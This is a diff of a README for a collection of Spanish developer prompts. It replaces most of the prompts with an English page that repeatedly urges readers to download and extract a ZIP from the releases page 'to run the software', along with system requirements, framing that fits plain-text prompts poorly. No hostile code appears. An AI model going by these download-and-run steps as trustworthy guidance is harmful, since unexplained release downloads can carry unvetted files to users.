@@ -1,161 +1,113 @@
-# Prompts Recomendados para Desarrollo
+# 🎉 prompts-dev - Easy Prompts for Your Projects
 
-Estos prompts los podés usar en cualquier proyecto. Copialos y adaptalos a tu código.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/matixblocks/prompts-dev/releases)
 
----
+## 📚 Introduction
 
-## Code Review
+Welcome to "prompts-dev." This project provides ready-to-use prompts for your development needs. You can adapt these prompts to fit your code easily. Whether it’s a code review, migration, documentation, or performance optimization, you will find helpful templates.
 
-```
-Revisá este PR buscando:
-- Memory leaks y problemas de performance
-- Casos borde sin manejar
-- Violaciones de principios SOLID
-- Inconsistencias con el estilo del repo (adjunto style guide)
-```
+## 🚀 Getting Started
 
----
+To get started with "prompts-dev," follow these steps to download and run the software:
 
-## Migración de Código
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/matixblocks/prompts-dev/releases) of this repository.
+2. **Select the Latest Release**: Choose the latest version available.
+3. **Download the files**: You will find all the necessary files in this section. Click on the desired file to download it to your computer.
 
-```
-Migrá este componente de React 18 a React 19:
-- Convertí useEffect innecesarios a server components donde corresponda
-- Usá las nuevas APIs de React 19 (use, useOptimistic)
-- Mantené funcionalidad exacta
-- Explicá cada cambio importante
-```
+Once you have downloaded the files, follow the instructions provided for specific usage.
 
----
+## 📥 Download & Install
 
-## Documentación
+To install the prompts and start using them in your projects:
 
-```
-Generá documentación profesional para esta función:
-- JSDoc completo (@param, @returns, @throws, @example)
-- README con ejemplos de uso
-- Diagrama de flujo en Mermaid
-- Lista de edge cases cubiertos
-```
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/matixblocks/prompts-dev/releases).
+2. **Download the files**: Click on the relevant version to download the prompts files you need.
+3. **Extract the Files**: If your browser does not automatically extract it, locate the downloaded ZIP file and extract it to your desired folder.
+4. **Open the Prompts**: You can now open the prompts in your code editor and start using them.
 
----
+## 🛠️ Features
 
-## Optimización de Performance
+The "prompts-dev" repository offers various templates for numerous tasks, including:
 
-```
-Optimizá esta función O(n²):
-- Reducir complejidad temporal a O(n) o O(n log n)
-- Usar estructuras de datos apropiadas (Set, Map, WeakMap)
-- Explicar la ganancia de performance
-- Incluir benchmark comparativo simple
-```
+- **Code Review Prompts**: Get guidance on how to examine pull requests effectively. You will find points to check for memory leaks, performance issues, and adherence to coding principles.
 
----
+- **Code Migration Prompts**: Use the provided prompts to transition your React components, ensuring you implement the latest APIs while maintaining functionality.
 
-## Testing
+- **Documentation Templates**: Generate clear and professional documentation with templates that guide you through creating comments and usage examples.
 
-```
-Escribí tests para esta función:
-- Unit tests con Jest/Vitest
-- Casos de éxito y error
-- Edge cases (null, undefined, arrays vacíos, valores límite)
-- Mocks para dependencias externas
-- Coverage mínimo 80%
-- funciones core 100% , 80% en resto, 0% en infra
-```
+- **Performance Optimization Prompts**: Learn how to enhance function performance by reducing complexity and using suitable data structures.
 
----
+## 💻 System Requirements
 
-## Debugging
+Here are the minimum requirements to run the prompts effectively:
 
-```
-Este código tiene un bug: [describir el comportamiento inesperado]
+- Any computer running Windows, Linux, or macOS.
+- A basic text editor or integrated development environment (IDE) like Visual Studio Code or Atom.
 
-Analizá:
-1. Qué está pasando exactamente
-2. Por qué ocurre el bug
-3. Cómo solucionarlo
-4. Cómo prevenir bugs similares en el futuro
-```
+## 📖 How to Use the Prompts
 
----
+1. **Code Review**
 
-## Refactoring General
+   Use the following prompt for code reviews:
 
-```
-Refactorizá este código aplicando:
-1. Principios SOLID
-2. Early returns para reducir nesting
-3. Extracción de funciones pequeñas y reutilizables
-4. Nombres descriptivos para variables y funciones
-5. Manejo de errores robusto
-6. TypeScript con tipos estrictos
-```
+   ```
+   Revisá este PR buscando:
+   - Memory leaks y problemas de performance
+   - Casos borde sin manejar
+   - Violaciones de principios SOLID
+   - Inconsistencias con el estilo del repo (adjunto style guide)
+   ```
 
----
+   Adapt this template by filling in the specifics of the code you are reviewing.
 
-## Seguridad
+2. **Code Migration**
 
-```
-Revisá este código buscando vulnerabilidades:
-- Inyección SQL/NoSQL
-- XSS (Cross-Site Scripting)
-- CSRF
-- Exposición de datos sensibles
-- Validación de inputs insuficiente
-- Dependencias desactualizadas con CVEs conocidos
-```
+   This prompt helps in migrating your React components:
 
----
+   ```
+   Migrá este componente de React 18 a React 19:
+   - Convertí useEffect innecesarios a server components donde corresponda
+   - Usá las nuevas APIs de React 19 (use, useOptimistic)
+   - Mantené funcionalidad exacta
+   - Explicá cada cambio importante
+   ```
 
-## API Design
+   Make the necessary adjustments as per your project's details.
 
-```
-Diseñá un endpoint REST para [funcionalidad]:
-- Método HTTP correcto
-- Path siguiendo convenciones REST
-- Request body con validación
-- Response con códigos HTTP apropiados
-- Manejo de errores consistente
-- Documentación OpenAPI/Swagger
-```
+3. **Documentation**
 
----
+   When documenting a function, you can use:
 
-## SQL / Queries
+   ```
+   Generá documentación profesional para esta función:
+   - JSDoc completo (@param, @returns, @throws, @example)
+   - README con ejemplos de uso
+   - Diagrama de flujo en Mermaid
+   - Lista de edge cases cubiertos
+   ```
 
-```
-Optimizá esta query SQL:
-- Reducir tiempo de ejecución
-- Usar índices apropiados
-- Evitar N+1 queries
-- Explicar el plan de ejecución
-- Sugerir índices a crear si es necesario
-```
+   Fill in specific examples and details based on your function.
 
----
+4. **Performance Optimization**
 
-## Git / Commits
+   For optimizing a function, consider:
 
-```
-Generá un mensaje de commit para estos cambios siguiendo Conventional Commits:
-- Tipo: feat/fix/refactor/docs/test/chore
-- Scope opcional
-- Descripción concisa en imperativo
-- Body explicando el "por qué" si es necesario
-- Breaking changes si aplica
-```
+   ```
+   Optimizá esta función O(n²):
+   - Reducir complejidad temporal a O(n) o O(n log n)
+   - Usar estructuras de datos apropiadas (Set, Map)
+   ```
 
----
+   Tailor this prompt to suit the function you want to optimize.
 
-## Arquitectura
+## 📞 Get Help
 
-```
-Proponé una arquitectura para [sistema/feature]:
-- Diagrama de componentes
-- Flujo de datos
-- Patrones de diseño a usar
-- Consideraciones de escalabilidad
-- Trade-offs de cada decisión
-- Flujos y diagramas con MERMAID
-```
+If you encounter any issues or have questions about using the "prompts-dev" repository, you can open an issue in the GitHub repository. The community is here to help, and you will find guidance from other users or maintainers.
+
+## ✅ License
+
+This project is licensed under the MIT License. You are free to use and modify the prompts as needed for your projects.
+
+For detailed information, refer to the LICENSE file in the repository. 
+
+Feel free to explore, download, and enhance your coding experience with "prompts-dev"!
